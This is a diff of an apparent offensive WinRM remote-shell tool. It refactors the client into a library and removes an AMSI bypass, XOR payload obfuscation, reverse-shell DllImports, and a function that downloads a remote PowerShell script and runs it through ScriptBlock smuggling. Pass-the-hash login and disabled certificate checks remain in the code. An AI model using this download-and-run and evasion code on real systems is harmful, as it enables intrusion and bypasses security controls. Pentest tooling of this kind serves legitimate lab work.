@@ -1,14 +1,10 @@
-import os, sys, re, uuid, logging, time, shlex, ssl
+import os, sys, re, uuid, logging, time, ssl
 
 from copy import deepcopy
 from base64 import b64encode, b64decode
 from struct import pack, unpack, error
-from signal import SIGINT, signal, getsignal
 from random import randbytes, randint
-from pathlib import PureWindowsPath, Path
 from datetime import datetime, UTC
-from argparse import ArgumentParser
-from ipaddress import ip_address
 
 # pip install xmltodict
 import xmltodict
@@ -73,22 +69,6 @@ def serialize(obj):
 def deserialize(data):
     return xmltodict.parse(data, strip_whitespace=False)
 
-def split_args(cmdline):
-    try:
-        args = shlex.split(cmdline, posix=False)
-    except ValueError:
-        return []
-
-    fixed = []
-    for arg in args:
-        if arg.startswith('"') and arg.endswith('"'):
-            fixed.append(arg[1:-1])
-        elif arg.startswith("'") and arg.endswith("'"):
-            fixed.append(arg[1:-1])
-        else:
-            fixed.append(arg)
-    return fixed
-
 _utfstr = re.compile(r'_x([0-9a-fA-F]{4})_')
 def utfstr(s):
     # chars inside xml strings that have non-printable characters are encoded like this, eg:
@@ -99,9 +79,6 @@ def utfstr(s):
         return _utfstr.sub(lambda m: bytes.fromhex(m.group(1)).decode("utf-16be"), s)
     except:
         return s
-
-def xorenc(xs, key):
-    return bytes(x ^ key for x in xs)
 
 zero_uuid = str(uuid.UUID(bytes_le=bytes(16))).upper()
 
@@ -124,7 +101,6 @@ def krb5_mech_indep_token_decode(data):
     return decoder.decode(data[skip:], asn1Spec=ObjectIdentifier)
 
 # -- soap templates for winrm: --------------------------------------------------------------------
-# i know this is jank as !@&#, but i only need a bare minimum to have a working shell:
 soap_req_tmpl = {
     's:Envelope': {
         '@xmlns:rsp': 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell',
@@ -150,12 +126,10 @@ soap_req_tmpl = {
                 '#text': 'http://schemas.microsoft.com/powershell/Microsoft.PowerShell'
             },
             'wsmv:SessionId': { '@s:mustUnderstand': 'false', '#text': 'REPLACEME' },
-            'wsa:To': 'REPLACEME',
+            'wsa:To': 'http://localhost',
             'wsman:OptionSet': {
                 '@s:mustUnderstand': 'true',
-                #'wsman:Option': {
-                #    # REPLACEME
-                #}
+                #'wsman:Option': { REPLACEME }
             },
             "wsman:SelectorSet" : {
                 # REPLACEME
@@ -176,12 +150,11 @@ soap_actions = {
 }
 
 # fill in common fields for soap request:
-def soap_req(action, session_id, url, shell_id=None, message_id=None, timeout=20):
-    message_id = message_id or str(uuid.uuid4()).upper()
+def soap_req(action, session_id, shell_id=None, timeout=20):
+    message_id = str(uuid.uuid4()).upper()
     req = deepcopy(soap_req_tmpl)
     req["s:Envelope"]["s:Header"]["wsa:Action"]["#text"] = soap_actions[action]
     req["s:Envelope"]["s:Header"]["wsa:MessageID"] = "uuid:" + message_id
-    req["s:Envelope"]["s:Header"]["wsa:To"] = url
     req["s:Envelope"]["s:Header"]["wsmv:SessionId"]["#text"] = f"uuid:{session_id}"
     req["s:Envelope"]["s:Header"]["wsman:OperationTimeout"] = f"PT{timeout}S"
 
@@ -198,7 +171,7 @@ def soap_rsp(rsp):
     if action.endswith("wsman/fault"):
         fault = body["s:Fault"]
         return {
-            "fault"   : "OK",
+            "fault"   : action,
             "subcode" : fault.get("s:Code",   {}).get("s:Subcode", {}).get("s:Value") or "",
             "reason"  : fault.get("s:Reason", {}).get("s:Text", {}).get("#text") or "",
             "detail"  : fault.get("s:Detail", {}).get("f:Message") or "",
@@ -209,20 +182,20 @@ def soap_rsp(rsp):
         if isinstance(streams, dict): # sometimes there's just one stream
             streams = [ streams ]
         return {
-            "receive" : "OK",
+            "receive" : action,
             "streams" : [ b64decode(s.get("#text", "")) for s in streams ],
             "state"   : receive.get("rsp:CommandState", {}).get("@State") or ""
         }
     elif action.endswith("transfer/CreateResponse"):
-        return { "create" : "OK", }
+        return { "create" : action }
     elif action.endswith("shell/SignalResponse"):
-        return { "signal" : "OK" }
+        return { "signal" : action }
     elif action.endswith("transfer/DeleteResponse"):
-        return { "delete" : "OK" }
+        return { "delete" : action }
     elif action.endswith("shell/CommandResponse"):
-        return { "command" : "OK" }
+        return { "command" : action }
     else:
-        return { "unknown" : rsp } # for debugging
+        return { "unknown" : action, "debug" : rsp } # for debugging
 
 
 # -- PSObjects: -----------------------------------------------------------------------------------
@@ -399,31 +372,35 @@ def defragment(streams, object_buffer):
 
 # -- transports: ----------------------------------------------------------------------------------
 class BasicTransport:
-    def __init__(self, args):
+    def __init__(self, url, username, password):
         self.session = Session()
+        self.session.verify = False
         self.session.headers["User-Agent"] = SKIP_HEADER
         self.session.headers["Accept-Encoding"] = SKIP_HEADER
-        self.url  = args.url
-        self.auth = (args.username, args.password)
+        self.url  = url
+        self.auth = (username, password)
 
     def send(self, req):
-        rsp = self.session.post(self.url, verify=False, auth=self.auth, data=req, headers={
+        rsp = self.session.post(self.url, auth=self.auth, data=req, headers={
             "Content-Type" : "application/soap+xml;charset=UTF-8"
         })
         return rsp.content
 
 class NTLMTransport:
-    def __init__(self, args):
-        self.args    = args
-        self.session = None
-        if args.ssl:
-            host = urlparse(args.url).hostname
-            port = urlparse(args.url).port or 443
-            cert = ssl.get_server_certificate((host, port))
+    def __init__(self, url, username, password="", nt_hash=""):
+        self.url      = url
+        self.username = username
+        self.password = password
+        self.nt_hash  = nt_hash
+        self.ssl = urlparse(url).scheme == "https"
+        self.session  = None
+
+        if self.ssl:
+            cert = ssl.get_server_certificate((urlparse(url).hostname, urlparse(url).port or 443))
             cert = cert.removeprefix("-----BEGIN CERTIFICATE-----\n")
             cert = cert.removesuffix("-----END CERTIFICATE-----\n")
             cert = SHA256.new(b64decode(cert)).digest()
-            app_data  = b"tls-server-end-point:" + cert
+            app_data = b"tls-server-end-point:" + cert
             self.gss_bindings = MD5.new(bytes(16) + pack("<I", len(app_data)) + app_data).digest()
 
     def send(self, req):
@@ -460,7 +437,7 @@ class NTLMTransport:
         data += b"--Encrypted Boundary\r\n"
         data += prefix + pack("<I", len(sig)) + sig + enc + suffix
 
-        rsp = self.session.post(self.args.url, verify=False, data=data, headers={
+        rsp = self.session.post(self.url, data=data, headers={
             "Content-Type" : f'multipart/encrypted;protocol="{protocol}";boundary="Encrypted Boundary"'
         })
 
@@ -491,22 +468,16 @@ class NTLMTransport:
         return rsp
 
     def _auth(self, url=None):
-        self.session = None
-        self.msgseq  = None
-        self.key_cli = None
-        self.key_srv = None
-        self.rc4_cli = None
-        self.rc4_srv = None
-
-        s = Session()
-        s.headers["User-Agent"] = SKIP_HEADER
-        s.headers["Accept-Encoding"] = SKIP_HEADER
+        session = Session()
+        session.verify = False
+        session.headers["User-Agent"] = SKIP_HEADER
+        session.headers["Accept-Encoding"] = SKIP_HEADER
 
         type1 = getNTLMSSPType1()
         type1["flags"] = 0xe0088237 # wiresharked
         type1_token = "Negotiate " + b64str(type1.getData())
 
-        rsp = s.post(self.args.url, verify=False, headers={ "Authorization" : type1_token })
+        rsp = session.post(self.url, headers={ "Authorization" : type1_token })
 
         www_auth = rsp.headers.get("WWW-Authenticate", "")
         if not www_auth.startswith("Negotiate "):
@@ -515,7 +486,7 @@ class NTLMTransport:
         type2 = b64decode(www_auth.removeprefix("Negotiate "))
 
         # include tls channel bindings in case CbtHardeningLevel=Strict
-        if self.args.ssl:
+        if self.ssl:
             chal = NTLMAuthChallenge(type2)
             info = AV_PAIRS(chal['TargetInfoFields'])
             info[NTLMSSP_AV_CHANNEL_BINDINGS] = self.gss_bindings
@@ -524,41 +495,40 @@ class NTLMTransport:
             chal["TargetInfoFields_max_len"]  = len(info.getData())
             type2 = chal.getData()
 
-        nt_hash = bytes.fromhex(self.args.nt_hash) if self.args.nt_hash else ""
-        type3, key = getNTLMSSPType3(type1, type2, self.args.username, self.args.password,
-                                     "", "", nt_hash)
+        nt_hash = bytes.fromhex(self.nt_hash) if self.nt_hash else ""
+        type3, key = getNTLMSSPType3(type1, type2, self.username, self.password, "", "", nt_hash)
 
         type3_token = "Negotiate " + b64str(type3.getData())
-        rsp = s.post(self.args.url, verify=False, headers= { "Authorization" : type3_token })
+        rsp = session.post(self.url, headers= { "Authorization" : type3_token })
 
         flags = type3["flags"]
 
-        self.session = s
+        self.session = session
         self.msgseq  = 0
         self.key_cli = SIGNKEY(flags, key, "Client")
         self.key_srv = SIGNKEY(flags, key, "Server")
         self.rc4_cli = ARC4.new(SEALKEY(flags, key, "Client"))
         self.rc4_srv = ARC4.new(SEALKEY(flags, key, "Server"))
 
-class KerberosTransport:
-    def __init__(self, args):
-        self.args       = args
-        self.tgs_ticket = None
-        self.tgs_cipher = None
-        self.tgs_key    = None
-        self.session    = None
-        self.subkey     = None
-        self.cipher     = None
-        self.msgseq     = None
 
-        # -- get TGS and keep it throught the lifetime of this object: ----------------------------
-        user = Principal(args.username, type=PrincipalNameType.NT_PRINCIPAL.value)
-        http = Principal(args.spn,      type=PrincipalNameType.NT_PRINCIPAL.value)
+class KerberosTransport:
+    def __init__(self, url, dc_ip, spn, domain, username, password="", nt_hash="", aes_key=""):
+        self.url      = url
+        self.ssl      = urlparse(url).scheme == "https"
+        self.domain   = domain
+        self.username = username
+        self.password = password
+        self.nt_hash  = nt_hash
+        self.aes_key  = aes_key
+        self.session  = None
+
+        user = Principal(username, type=PrincipalNameType.NT_PRINCIPAL.value)
+        http = Principal(spn,      type=PrincipalNameType.NT_PRINCIPAL.value)
 
         tgt, tgs = None, None
 
         if os.getenv("KRB5CCNAME"):
-            _, _, tgt, tgs = CCache.parseFile(target=args.spn)
+            _, _, tgt, tgs = CCache.parseFile(target=spn)
             if tgt and not tgs:
                 cipher = tgt['cipher']
                 tgtkey = tgt['sessionKey']
@@ -568,15 +538,15 @@ class KerberosTransport:
                 tgskey = tgs['sessionKey']
                 tgs    = tgs['KDC_REP']
         else:
-            logging.info(f"requesting TGT for {args.domain}\\{args.username}")
-            tgt, cipher, _, tgtkey = getKerberosTGT(user, args.password, args.domain, "",
-                                                    args.nt_hash, args.aesKey, args.dc_ip)
+            logging.info(f"requesting TGT for {domain}\\{username}")
+            tgt, cipher, _, tgtkey = getKerberosTGT(user, password, domain, "", nt_hash, aes_key, dc_ip)
+
         if not tgt and not tgs:
             raise KerberosError("Could not get TGT or TGS")
 
         if not tgs:
-            logging.info(f"requesting TGS for {args.spn}")
-            tgs, cipher, _, tgskey = getKerberosTGS(http, args.domain, args.dc_ip, tgt, cipher, tgtkey)
+            logging.info(f"requesting TGS for {spn}")
+            tgs, cipher, _, tgskey = getKerberosTGS(http, domain, dc_ip, tgt, cipher, tgtkey)
 
         ticket = Ticket()
         ticket.from_asn1(decoder.decode(tgs, asn1Spec=TGS_REP())[0]["ticket"])
@@ -585,10 +555,8 @@ class KerberosTransport:
         self.tgs_cipher = cipher
         self.tgs_key    = tgskey
 
-        if args.ssl:
-            host = urlparse(args.url).hostname
-            port = urlparse(args.url).port or 443
-            cert = ssl.get_server_certificate((host, port))
+        if self.ssl:
+            cert = ssl.get_server_certificate((urlparse(url).hostname, urlparse(url).port or 443))
             cert = cert.removeprefix("-----BEGIN CERTIFICATE-----\n")
             cert = cert.removesuffix("-----END CERTIFICATE-----\n")
             cert = SHA256.new(b64decode(cert)).digest()
@@ -627,7 +595,7 @@ class KerberosTransport:
         data += b"--Encrypted Boundary\r\n"
         data += prefix + pack("<I", len(r1)) + r1 + r0 + suffix
 
-        rsp = self.session.post(self.args.url, verify=False, data=data, headers={
+        rsp = self.session.post(self.url, verify=False, data=data, headers={
             "Content-Type" : f'multipart/encrypted;protocol="{protocol}";boundary="Encrypted Boundary"'
         })
 
@@ -656,14 +624,14 @@ class KerberosTransport:
         return rsp
 
     def _auth(self):
-        user = Principal(self.args.username, type=PrincipalNameType.NT_PRINCIPAL.value)
+        user = Principal(self.username, type=PrincipalNameType.NT_PRINCIPAL.value)
 
         checksum = CheckSumField()
         checksum['Lgth']   = 16
         checksum['Flags']  = GSS_C_CONF_FLAG | GSS_C_INTEG_FLAG | GSS_C_SEQUENCE_FLAG
         checksum['Flags'] |= GSS_C_REPLAY_FLAG | GSS_C_MUTUAL_FLAG
         # include tls channel binding in case CbtHardeningLevel=Strict
-        if self.args.ssl:
+        if self.ssl:
             checksum['Bnd'] = self.gss_bindings
 
         now = datetime.now(UTC)
@@ -671,7 +639,7 @@ class KerberosTransport:
         auth = Authenticator()
         seq_set(auth, 'cname', user.components_to_asn1)
         auth['authenticator-vno']  = 5
-        auth['crealm']             = self.args.domain
+        auth['crealm']             = self.domain
         auth['cusec']              = now.microsecond
         auth['ctime']              = KerberosTime.to_asn1(now)
         auth['cksum']              = noValue
@@ -701,9 +669,10 @@ class KerberosTransport:
 
         # -- ask for AP_REP via HTTP: -------------------------------------------------------------
         session = Session()
+        session.verify = False
         session.headers["User-Agent"] = SKIP_HEADER
         session.headers["Accept-Encoding"] = SKIP_HEADER
-        rsp = session.post(self.args.url, verify=False, headers={ "Authorization" : token })
+        rsp = session.post(self.url, headers={ "Authorization" : token })
         www_auth = rsp.headers.get("WWW-Authenticate", "")
 
         try:
@@ -724,17 +693,18 @@ class KerberosTransport:
         self.session = session
         self.msgseq  = 0
 
+
 # -- MS-PSRP stuff from https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp ------
 class Runspace:
-    def __init__(self, transport, args, timeout=5):
-        self.args            = args
-        self.transport       = transport(args)
-        self.timeout         = timeout
-        self.object_buffer   = {}
-        self.next_object_id  = 1
+    def __init__(self, transport, timeout=5):
+        self.transport      = transport
+        self.timeout        = timeout
+        self.object_buffer  = {}
+        self.next_object_id = 1
+        self.session_id     = str(uuid.uuid4()).upper()
+        self.shell_id       = str(uuid.uuid4()).upper()
+
         self.current_command_id = None
-        self.session_id      = str(uuid.uuid4()).upper()
-        self.shell_id        = str(uuid.uuid4()).upper()
 
     def __enter__(self):
         messages = fragment(self.next_object_id, [
@@ -742,7 +712,7 @@ class Runspace:
             (INIT_RUNSPACEPOOL,  self.shell_id, zero_uuid, serialize(ps_runspace_pool))
         ])
 
-        req = soap_req("create", self.session_id, self.args.url, timeout=self.timeout)
+        req = soap_req("create", self.session_id, timeout=self.timeout)
 
         req["s:Envelope"]["s:Header"]["wsman:OptionSet"]["wsman:Option"] = {
             "@MustComply" : 'true',
@@ -766,8 +736,7 @@ class Runspace:
         return self
 
     def __exit__(self, exc_type, exc_value, tb):
-        logging.debug(f"_delete : {self.shell_id}")
-        req = soap_req("delete", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
+        req = soap_req("delete", self.session_id, self.shell_id, self.timeout)
         self._send(req)
 
     def run_command(self, cmd, debug=True):
@@ -809,7 +778,7 @@ class Runspace:
                 elif msg_type == VERBOSE_RECORD: # from Write-Verbose
                     yield { "verbose" : utfstr(msg.get("Obj", {}).get("ToString") or "") }
 
-                elif msg_type == PIPELINE_STATE: # if there was an exception and treat it as error:
+                elif msg_type == PIPELINE_STATE: # return exceptions as errors:
                     err = msg.get("Obj", {}).get("MS", {}).get("Obj", {})
                     if err.get("@N") == "ExceptionAsErrorRecord":
                         yield { "error" : utfstr(err.get("ToString") or "uknonwn exception") }
@@ -819,7 +788,7 @@ class Runspace:
                         yield { "progress" : progress.get("#text", "") }
 
                 else: # debug strays in case i missed something:
-                    logging.debug(f"{msg_ids[msg_type]} : {msg}")
+                    logging.debug(f"{msg_ids.get(msg_type)} : {msg_type:x} : {msg}")
 
             if rsp["state"]:
                 break # == CommandState/Done when pipeline finishes
@@ -829,7 +798,7 @@ class Runspace:
     def interrupt(self):
         if not self.current_command_id:
             return
-        req = soap_req("signal", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
+        req = soap_req("signal", self.session_id, self.shell_id, self.timeout)
         req["s:Envelope"]["s:Body"] = {
             "rsp:Signal" : {
                 "@CommandId" : self.current_command_id,
@@ -843,7 +812,7 @@ class Runspace:
         return soap_rsp(deserialize(rsp))
 
     def _receive(self, command_id=None):
-        req = soap_req("receive", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
+        req = soap_req("receive", self.session_id, self.shell_id, self.timeout)
 
         req["s:Envelope"]["s:Header"]["wsman:OptionSet"]["wsman:Option"] = {
             "@Name" : "WSMAN_CMDSHELL_OPTION_KEEPALIVE", "#text" : "True"
@@ -867,7 +836,7 @@ class Runspace:
             (CREATE_PIPELINE, self.shell_id, command_id, serialize(create_pipeline))
         ])
 
-        req = soap_req("command", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
+        req = soap_req("command", self.session_id, self.shell_id, self.timeout)
         req["s:Envelope"]["s:Body"] = {
             "rsp:CommandLine" : {
                 "@CommandId" : command_id,
@@ -877,13 +846,33 @@ class Runspace:
         }
         rsp = self._send(req)
 
-        if rsp.get("command", "") == "OK":
+        if "command" in rsp:
             return command_id
 
+# so with Runspace class you can execute commands like this, eg:
+# transport = NTLMTransport("http://box.htb:5985/wsman", "username", "password")
+# with Runspace(transport) as runspace:
+#  for output in runspace.run_command("whoami /all"):
+#     print(output)
 
 
 
-# -- the rest here is UX stuff, meaning a janky Shell and dealing with commandline arguments -------
+# the rest of the code here parses impacket-style arguments (in main) and implements a
+# simple shell that runs a REPL loop:
+from signal import SIGINT, signal, getsignal
+from argparse import ArgumentParser
+from ipaddress import ip_address
+
+try:
+    from prompt_toolkit import prompt, ANSI
+    from prompt_toolkit.history import FileHistory
+    prompt_toolkit_available = sys.stdout.isatty()
+except ModuleNotFoundError:
+    print("'prompt_toolkit' not installed, using built-in 'readline'")
+    import readline, atexit
+    prompt_toolkit_available = False
+
+
 class CtrlCHandler:
     def __init__(self, max_interrupts=4, timeout=5):
         self.max_interrupts = max_interrupts
@@ -920,194 +909,37 @@ class CtrlCHandler:
         self.released = True
         return True
 
-# -- some types and imports for upload/download/amsi/netrun/psrun functionality: ------------------
-_ns = "A" + randbytes(randint(3,8)).hex()
-_xor_key = randint(1,255)
-
-# a workaround for getting a streaming console output from dynamically loaded .NET assemblies:
-host_writer_cs = """
-Add-Type -TypeDefinition @"
-namespace _NS {
-public class HostWriter : System.IO.TextWriter {
-  private System.Action<string> _act;
-  public HostWriter(System.Action<string> act) { _act = act; }
-  public override void Write(char v) { _act(v.ToString()); }
-  public override void Write(string v) { _act(v); }
-  public override void WriteLine(string v) { _act(v + System.Environment.NewLine); }
-  public override System.Text.Encoding Encoding { get { return System.Text.Encoding.UTF8; } }
-}}
-"@""".replace("_NS", _ns)
-
-# it is way too slow to do this in powershell for large files:
-xor_enc_cs = """
-Add-Type @"
-namespace _NS {
-public class X {
-    public static byte[] x(byte[] y) {
-        for(int i = 0; i < y.Length; i++) { y[i] ^= _KEY; }
-        return y;
-    }
-}}
-"@
-""".replace("_NS", _ns).replace("_KEY", str(_xor_key))
-
-# zipping files on windows will have \ as path separators and some linux tools bork:
-path_fix_cs = """
-Add-Type @"
-namespace _NS {
-public class PathFix : System.Text.UTF8Encoding {
-    public override byte[] GetBytes(string s) {
-        s=s.Replace("\\\\", "/");
-        return base.GetBytes(s);
-    }
-}}
-"@
-""".replace("_NS", _ns)
-
-# mangle DllImports a little:
-def dll_import(ns, lib, fun, sigs):
-    cls  = f"f{randbytes(randint(3,8)).hex()}"
-    name = f"g{randbytes(randint(3,8)).hex()}"
-    ret  = sigs[0]
-    args = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
-    code = f'[DllImport("{lib}",EntryPoint="{fun}")] public static extern {ret} {name}({args});'
-    globals()["_call_"   + fun] = f"[{_ns}.{cls}]::{name}"
-    globals()["_import_" + fun] = f"""Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"""
-
-# this will add _import_LoadLibrary and _call_LoadLibrary variables in global scope, etc:
-dll_import(_ns, "kernel32", "LoadLibrary",    ["IntPtr", "string"])
-dll_import(_ns, "kernel32", "GetProcAddress", ["IntPtr", "IntPtr", "string"])
-dll_import(_ns, "kernel32", "VirtualProtect", ["IntPtr", "IntPtr", "IntPtr", "uint", "out uint"])
-dll_import(_ns, "kernel32", "CreateProcess",  ["IntPtr", "IntPtr", "string", "IntPtr", "IntPtr", "bool", "uint", "IntPtr", "IntPtr", "Int64[]", "byte[]"])
-dll_import(_ns, "ws2_32",   "WSAStartup",     ["IntPtr", "short", "byte[]"])
-dll_import(_ns, "ws2_32",   "WSASocket",      ["IntPtr", "uint", "uint", "uint", "IntPtr", "uint", "uint"])
-dll_import(_ns, "ws2_32",   "WSAConnect",     ["IntPtr", "IntPtr", "byte[]", "int", "IntPtr", "IntPtr", "IntPtr", "IntPtr"])
-
-# when splicing strings into powershell scripts use this so not to worry about escaping chars, etc:
-def str_b64(arg):
-    return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"
-
 class Shell:
-    def __init__(self, transport, args):
-        self.args       = args
-        self.transport  = transport
+    def __init__(self, runspace):
+        self.runspace  = runspace
         self.cwd        = ""
-        self.stdout_log = None
         self.need_clear = False
 
-        if args.log:
-            self.start_log()
-
-        try:
-            if sys.stdout.isatty():
-                from prompt_toolkit import prompt, ANSI
-                from prompt_toolkit.history import FileHistory
-                __history = FileHistory(".winrmexec_prompt_toolkit_history")
-                self.prompt = lambda s: prompt(ANSI(s), history=__history, enable_history_search=True)
-            else:
-                raise ModuleNotFoundError # fallthrough to use readline
-
-        except ModuleNotFoundError:
-            import readline, atexit
-
-            if sys.stdout.isatty():
-                logging.warning("'prompt_toolkit' not installed, using built-in 'readline'")
-
-            histfile = ".winrmexec_readline_history"
-            try:
-                readline.read_history_file(histfile)
-            except FileNotFoundError:
-                pass
-            atexit.register(readline.write_history_file, histfile)
-            self.prompt = input
-
-    def __del__(self):
-        self.stop_log()
-
-    def start_log(self):
-        if not self.stdout_log:
-            logfile = f"winrmexec_{int(time.time())}_stdout.log"
-            self.write_info(f"logging output to {logfile}")
-            self.stdout_log = open(logfile, "wb")
-
-    def stop_log(self):
-        if self.stdout_log:
-            self.stdout_log.close()
-            self.stdout_log = None
-
-    def help(self):
-        print()
-        print("Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully")
-        print("\x1b[1m\x1b[31mThis is not an interactive shell!\x1b[0m If you need to run programs that expect")
-        print("inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell")
-        print()
-        print("Special !bangs:")
-        print("  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'")
-        print("                                   # if it contains whitespace")
-        print()
-        print("  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr")
-        print("                                   # if you can reach your ip from the box, because this can be slow;")
-        print("                                   # use -xor only in conjunction with !psrun/!netrun")
-        print()
-        print("  !amsi                            # amsi bypass, run this right after you get a prompt")
-        print()
-        print("  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is")
-        print("                                   # needed unless that script tries to load a .NET assembly; if you can't reach")
-        print("                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\\foo\\bar.ps1' (needs absolute path)")
-        print()
-        print("  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;")
-        print("                                   # !amsi first if you're getting '...program with an incorrect format' errors;")
-        print("                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\\foo\\bar.exe' (needs absolute path)")
-        print()
-        print("  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you")
-        print("                                   # you need to run an executable that expects input, try:")
-        print("                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' \"line1`nline2`nline3\"")
-        print("                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'")
-        print()
-        print("  !log                             # start logging output to winrmexec_[timestamp]_stdout.log")
-        print("  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log")
-        print()
+        if prompt_toolkit_available:
+            self.prompt_history = FileHistory(".winrmexec_history")
 
     def repl(self, inputs=None, debug=True):
-        with Runspace(self.transport, self.args, timeout=5) as runspace:
-            self.update_cwd(runspace)
-            for cmd in map(str.strip, inputs or self.read_line()):
-                if not cmd:
-                    continue
-                elif cmd in { "exit", "quit", "!exit", "!quit" }:
-                    return
-                elif cmd.startswith("!download "):
-                    self.download(runspace, cmd.removeprefix("!download "))
-                elif cmd.startswith("!upload "):
-                    self.upload(runspace, cmd.removeprefix("!upload "))
-                elif cmd.startswith("!amsi"):
-                    self.amsi_bypass(runspace)
-                elif cmd.startswith("!netrun "):
-                   self.netrun(runspace, cmd.removeprefix("!netrun "))
-                elif cmd.startswith("!psrun "):
-                   self.psrun(runspace, cmd.removeprefix("!psrun "))
-                elif cmd.startswith("!revshell "):
-                    self.revshell(runspace, cmd.removeprefix("!revshell "))
-                elif cmd.startswith("!log"):
-                    self.start_log()
-                elif cmd.startswith("!stop_log"):
-                    self.stop_log()
-                elif cmd.startswith("!") or cmd in { "help", "?" }:
-                    self.help()
-                else:
-                    if self.stdout_log:
-                        self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
-                        self.stdout_log.flush()
-                    self.run_with_interrupt(runspace, cmd, self.write_line)
-                    self.update_cwd(runspace)
+        if not inputs:
+            inputs = self.read_line()
+            self.update_cwd()
 
-    def update_cwd(self, runspace):
-        self.cwd = self.run_sync(runspace, "Get-Location | Select -Expand Path").strip()
+        for cmd in inputs:
+            if not cmd:
+                continue
+            elif cmd in { "exit", "quit" }:
+                return
+            else:
+                self.run_with_interrupt(cmd, self.write_line)
+                self.update_cwd()
 
     def read_line(self):
         while True:
             try:
-                cmd = self.prompt(f"\x1b[1m\x1b[33mPS\x1b[0m {self.cwd}> ")
+                pre = f"\x1b[1m\x1b[33mPS\x1b[0m {self.cwd}> "
+                if prompt_toolkit_available:
+                    cmd = prompt(ANSI(pre), history=self.prompt_history, enable_history_search=True)
+                else:
+                    cmd = input(pre)
             except KeyboardInterrupt:
                 continue
             except EOFError:
@@ -1115,32 +947,17 @@ class Shell:
             else:
                 yield cmd
 
-    def write_warning(self, msg):
-        self.write_line({ "warn" : msg })
-
-    def write_info(self, msg):
-        self.write_line({ "info" : msg, "endl" : "\n" })
-
-    def write_error(self, msg):
-        self.write_line({ "error" : msg })
-
-    def write_progress(self, msg):
-        self.write_line({ "progress" : msg })
-
     def write_line(self, out):
         clear = "\033[2K\r" if self.need_clear else ""
         self.need_clear = False
 
         log_msg = b""
-        if "stdout" in out: # from Write-Output
-            msg = out.get("stdout")
+        if msg := out.get("stdout"): # from Write-Output
             print(clear + msg, flush=True)
-            log_msg = msg.encode() + b"\n"
 
         elif msg := out.get("info"): # from Write-Host
             endl = out.get("endl", "\n")
             print(clear + msg, end=endl, flush=True)
-            log_msg = msg.encode() + endl.encode()
 
         elif msg := out.get("error"): # from Write-Error and exceptions
             print(clear + "\x1b[31m" + msg + "\x1b[0m", flush=True)
@@ -1155,32 +972,14 @@ class Shell:
             print(clear + "\x1b[34m" + progress + "\x1b[0m", end="\r", flush=True)
             self.need_clear = True
 
-        if self.stdout_log:
-            self.stdout_log.write(log_msg)
-            self.stdout_log.flush()
+    def update_cwd(self):
+        self.cwd = self.run_sync("Get-Location | Select -Expand Path").strip()
 
+    def run_sync(self, cmd):
+        return "\n".join(out.get("stdout") for out in self.runspace.run_command(cmd) if "stdout" in out)
 
-    def run_sync(self, runspace, cmd):
-        # use this only for short CmdLets you know will complete quickly and will not fail
-        # or timeout; also make sure that command selects exactly the property of the output
-        # that it needs with `... | Select -Expand PROP`, otherwise the outer `| Out-String`
-        # CmdLet will try to pretty-print the output which will sometimes truncate the lines
-        # in the output to fit into what it thinks is the width of the terminal:
-        return "\n".join(out.get("stdout") for out in runspace.run_command(cmd) if "stdout" in out)
-
-    def run_with_interrupt(self, runspace, cmd, output_handler=None, exception_handler=None):
-        # run a command and start streaming the output; this runs in the CtrlCHandler
-        # context so you can gracefully catch the Ctrl+C interrupts and try to send 'ctrl_c'
-        # signal to the remote pipeline instead of tearing down the program.
-
-        # `output_handler` is a function that receives a dict with { "stdout" : ".." } or
-        # { "error" : ".." }, etc and deals with it, don't to throw exceptions there;
-
-        # `exception_handler` should handle exceptions that happen inside `runspace.run_command`;
-        # if you think you dealt with the exception, return `True` and this will try
-        # continue the streaming, but maybe just let it fail or use it only to format debug messages;
-        # if `exception_handler` is not specified it will throw;
-        output_stream = runspace.run_command(cmd)
+    def run_with_interrupt(self, cmd, output_handler=None, exception_handler=None):
+        output_stream = self.runspace.run_command(cmd)
         while True:
             with CtrlCHandler(timeout=5) as h:
                 try:
@@ -1197,255 +996,14 @@ class Shell:
                     output_handler(out)
 
                 if h.interrupted:
-                    runspace.interrupt()
+                    self.runspace.interrupt()
 
         return h.interrupted > 0
 
 
-    def psrun(self, runspace, cmdline):
-        args = split_args(cmdline)[:2]
-
-        url = args[-1]
-        xorfunc = ""
-        if args[0].lower() == "-xor":
-            if len(args) != 2:
-                self.write_warning("missing URL")
-                return
-
-            if args[-1].lower().startswith("http"):
-                self.write_warning("use -xor only for files that were uploaded with !upload -xor")
-                return
-
-            xorfunc = f"[{_ns}.X]::x"
-
-        commands = [
-            xor_enc_cs,
-            f'$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})',
-            f'$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))',
-             "$c = $c.Ast.EndBlock.Copy()",
-             "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
-             "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
-             "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
-             "Remove-Variable @('a','b','c')"
-        ]
-
-        for cmd in commands:
-            logging.debug(cmd)
-            self.run_with_interrupt(runspace, cmd, self.write_line)
-
-
